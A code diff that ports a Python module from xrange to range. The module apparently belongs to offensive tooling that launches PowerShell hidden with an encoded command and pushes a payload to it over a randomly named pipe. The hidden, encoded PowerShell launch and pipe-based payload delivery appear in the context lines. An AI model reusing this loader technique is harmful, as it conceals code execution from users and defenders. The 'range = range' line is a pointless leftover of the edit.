@@ -19,7 +19,7 @@ from time import sleep
 from hashlib import md5
 
 if sys.version_info.major > 2:
-    xrange = range
+    range = range
 
 kernel32 = WinDLL('kernel32', use_last_error=True)
 
@@ -46,7 +46,7 @@ PIPE_LOADER_CMD_TEMPLATE = '{powershell} -w hidden -EncodedCommand {cmd}'
 POWERSHELL_PATH = r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
 
 def generate_loader_cmd(size):
-    pipename = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in xrange(10))
+    pipename = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))
     encoded = base64.b64encode(PIPE_LOADER_TEMPLATE.strip().format(
         pipename=pipename, size=size).encode('utf-16le'))
     cmd = PIPE_LOADER_CMD_TEMPLATE.format(powershell=POWERSHELL_PATH, cmd=encoded)
@@ -68,7 +68,7 @@ def push_payload(payload, timeout=90, log_cb=None):
             pipepath = '\\\\.\\pipe\\' + pipename
 
             found = False
-            for i in xrange(timeout):
+            for i in range(timeout):
                 found = WaitNamedPipe(pipepath, 1000)
                 if found:
                     break
